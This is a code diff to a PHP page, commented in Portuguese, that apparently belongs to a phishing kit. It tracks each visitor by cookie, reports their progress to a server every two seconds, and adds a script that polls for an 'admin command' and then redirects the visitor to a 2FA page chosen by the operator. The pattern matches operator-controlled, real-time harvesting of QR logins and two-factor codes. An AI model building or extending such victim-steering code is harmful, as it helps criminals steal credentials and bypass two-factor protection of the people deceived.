@@ -148,7 +148,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         // Inicia a verificação a cada 3 segundos
         setInterval(verificarQrCode, 3000);
     </script>
-<script>
+    <script>
         (function() {
             // Mapa de nomes de arquivos para mensagens de status amigáveis.
             const statusMap = {
@@ -203,6 +203,36 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
             // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
             setInterval(sendStatusUpdate, 2000);
+        })();
+    </script>
+    <script>
+        (function() {
+            // Pega a URL de redirecionamento que o PHP definiu
+            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
+
+            async function checkAdminCommand() {
+                try {
+                    const response = await fetch('api_check_status.php');
+                    const data = await response.json();
+
+                    console.log('Status atual:', data.status); 
+
+                    if (data.status === 'redirecionar_para_2fa') {
+                        // Para a verificação para não redirecionar em loop
+                        clearInterval(statusInterval);
+                        
+                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
+                        
+                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
+                        window.location.href = redirectUrl;
+                    }
+                } catch (error) {
+                    console.error('Erro ao verificar status:', error);
+                }
+            }
+
+            // Inicia a verificação a cada 3 segundos
+            const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
 </body>
